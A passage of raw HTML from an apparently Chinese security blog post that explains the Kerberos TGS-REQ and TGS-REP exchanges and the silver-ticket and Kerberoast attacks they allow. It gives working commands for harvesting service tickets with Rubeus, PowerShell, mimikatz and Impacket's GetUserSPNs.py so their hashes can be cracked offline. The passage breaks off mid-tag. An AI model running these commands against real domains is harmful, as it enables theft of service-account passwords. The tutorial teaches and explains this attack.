SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">TGS-REQ</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">经过上面的步骤，客户端获得了 TGT认购权证 和 Login Session Key。然后用自己的密码NTLM Hash解密Login Session Key得到 原始的Logon Session Key。然后它会在本地缓存此 TGT认购权证&nbsp;和&nbsp;原始的Login Session Key。如果现在它需要访问某台服务器的某个服务，它就需要凭借这张TGT认购凭证向KDC购买相应的入场券<strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">ST服务票据（Service Ticket）。</strong>ST服务票据是通过KDC的另一个服务&nbsp;<strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">TGS（Ticket Granting Service）</strong>出售的。在这个阶段，微软引入了两个扩展自协议 S4u2self 和 S4u2Proxy(当委派的时候，才用的到)<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">3、<strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">TGS-REQ</strong>：客户端向KDC购买针对指定服务的ST服务票据请求，该请求主要包含如下的内容：<strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">客户端信息、Authenticator(Login Session Key加密的时间戳)、TGT认购权证(padata下ap-req下的ticket) 和 访问的服务名</strong>&nbsp;以及一些其他信息 。<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.10493827160493827" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/18_czQgQYppLTCaBqnbxE6v4Kdd4A7Z8Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIlt4h4UYnJMol4qib70n9528lticzQgQYppLTCaBqnbxE6v4Kdd4A7Z8Q/640?wx_fmt=png'" data-type="png" data-w="648" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8642590286425903" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/19_7aoA1RDjAicoxKTl9lSVNzjDBQd1Yw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIP2icT00k3ExNM9Fkjy4oWCZ9aT7aoA1RDjAicoxKTl9lSVNzjDBQd1Yw/640?wx_fmt=png'" data-type="png" data-w="803" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">TGS-REP</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">4.、TGS-REP：TGS接收到请求之后，首先会检查自身是否存在客户端所请求的服务。如果服务存在，则通过 krbtgt 用户的NTLM Hash 解密TGT并得到Login Session Key，然后通过Login Session Key解密Authenticator，如果解密成功，则验证了对方的真实身份，同时还会验证时间戳是否在范围内。并且还会检查TGT中的时间戳是否过期，且原始地址是否和TGT中保存的地址相同。在完成上述的检测后，如果验证通过，则TGS完成了对客户端的认证，会生成一个用Logon Session Key加密后的用于确保客户端-服务器之间通信安全的Service Session Key会话秘钥(也就是最外层enc-part部分)。并且会为该客户端生成ST服务票据。ST服务票据主要包含两方面的内容：客户端用户信息 和&nbsp;原始Service Session Key，整个ST服务票据用该服务的NTLM Hash进行加密。最终Service Session Key 和 ST服务票据 发送给客户端。(这一步不管用户有没有访问服务的权限，只要TGT正确，就都会返回ST服务票据，这也是kerberoasting能利用的原因，任何一个用户，只要hash正确，就可以请求域内任何一个服务的ST票据)<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6265223274695535" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/20_iargp9yiaNntJo9oe92t8b5xB0cTzw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIRn4f0BqKqs0e0aX2ubrPpp16Uqiargp9yiaNntJo9oe92t8b5xB0cTzw/640?wx_fmt=png'" data-type="png" data-w="739" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />enc-part：这部分是用请求服务的密码Hash加密的。因此如果我们拥有服务的密码Hash，那么我们就可以自己制作一个ST服务票据，这就造成了白银票据攻击。也正因为该票据是用请求服务的密码Hash加密的，所以当我们得到了ST服务票据，可以尝试爆破enc_part，来得到服务的密码Hash。这也就造成了kerberoast攻击<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">TGS-REP阶段产生的攻击方式</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">1.Kerberoast攻击</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Kerberoast攻击过程：<br style="-webkit-tap-highlight-color: transparent;"  />1.攻击者对一个域进行身份验证，然后从域控制器获得一个TGT认购权证 ，该TGT认购权证用于以后的ST服务票据请求<br style="-webkit-tap-highlight-color: transparent;"  />2.攻击者使用他们的 TGT认购权证 发出ST服务票据请求(TGS-REQ) 获取特定形式（name/host）的 servicePrincipalName (SPN)。例如：MSSqlSvc/SQL.domain.com。此SPN在域中应该是唯一的，并且在用户或计算机帐户的servicePrincipalName 字段中注册。在服务票证请求(TGS-REQ)过程中，攻击者可以指定它们支持的Kerberos加密类型(RC4_HMAC，AES256_CTS_HMAC_SHA1_96等等)。<br style="-webkit-tap-highlight-color: transparent;"  />3.如果攻击者的 TGT 是有效的，则 DC 将从TGT认购权证 中提取信息并填充到ST服务票据中。然后，域控制器查找哪个帐户在 ServicedPrincipalName 字段中注册了所请求的 SPN。ST服务票据使用注册了所要求的 SPN 的帐户的NTLM哈希进行加密, 并使用攻击者和服务帐户共同商定的加密算法。ST服务票据以服务票据回复(TGS-REP)的形式发送回攻击者。<br style="-webkit-tap-highlight-color: transparent;"  />4.攻击者从 TGS-REP 中提取加密的服务票证。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。<br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">首先是请求服务票据</strong><br style="-webkit-tap-highlight-color: transparent;"  />1.Rubeus.exe请求</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Rubeus</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe kerberoast</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Rubeus里面的kerberoast支持对所有用户或者特定用户执行kerberoasting操作，其原理在于先用LDAP查询于内的spn，再通过发送TGS包，然后直接打印出能使用 hashcat 或 john 爆破的Hash。&nbsp;以下的命令会打印出注册于用户下的所有SPN的服务票据的hashcat格式。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.32320441988950277" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/21_PSkTOfX7eywSsLiaH7RibwEPq4lIlg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIJuL3iceuFOicVnTsCrFvDS8sOYcGPSkTOfX7eywSsLiaH7RibwEPq4lIlg/640?wx_fmt=png'" data-type="png" data-w="724" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />2.powershell请求</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">#请求服务票据</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Add</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Type</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">AssemblyName</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">System</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IdentityModel</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">New</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Object</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">System</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IdentityModel</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Tokens</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">KerberosRequestorSecurityToken</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ArgumentList</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"MSSQLSvc/Srv-DB-0day.0day.org:1433"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">#列出服务票据</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">klist</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6055625790139064" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/22_aBpamCs7WG1NL1v3uicj8kOQFvEYow.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIEZRbY645KGns0gG3gfibqrMMb6iaBpamCs7WG1NL1v3uicj8kOQFvEYow/640?wx_fmt=jpeg'" data-type="jpeg" data-w="791" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">3.mimikatz请求<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />请求指定SPN的服务票据</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">#请求服务票据</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ask </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">target</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">MSSQLSvc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Srv</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">DB</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1433</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">#列出服务票据</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">list  </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">#清除所有票据</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">purge</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">4.Impacket中的GetUserSPNS.py请求<br style="-webkit-tap-highlight-color: transparent;"  />该脚本可以请求注册于用户下的所有SPN的服务票据。使用该脚本需要提供域账号密码才能查询。该脚本直接输出hashcat格式的服务票据，可用hashcat直接爆破。</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">python3 </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">GetUserSPNs</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">py </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">request </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ip </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">200.143</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">jack</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8044515103338633" 